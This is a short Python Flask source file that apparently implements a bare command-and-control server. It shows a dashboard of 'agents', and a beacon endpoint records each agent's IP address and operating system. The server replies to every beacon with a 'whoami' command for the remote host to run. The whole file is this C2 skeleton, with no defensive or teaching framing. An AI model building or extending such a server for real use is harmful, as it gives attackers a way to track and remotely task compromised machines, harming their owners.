from flask import Flask, render_template, request, jsonify
import os

template_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), 'templates'))
app = Flask(__name__, template_folder=template_dir)
agents = {}

@app.route('/')
def dashboard(): return render_template('index.html', agents=agents)

@app.route('/api/beacon', methods=['POST'])
def beacon():
    data = request.json
    aid = data.get('id', 'Unknown')
    agents[aid] = {"ip": request.remote_addr, "os": data.get('os', 'Unknown'), "status": "Online"}
    return jsonify({"command": "whoami"})

if __name__ == "__main__": app.run(host='0.0.0.0', port=5000)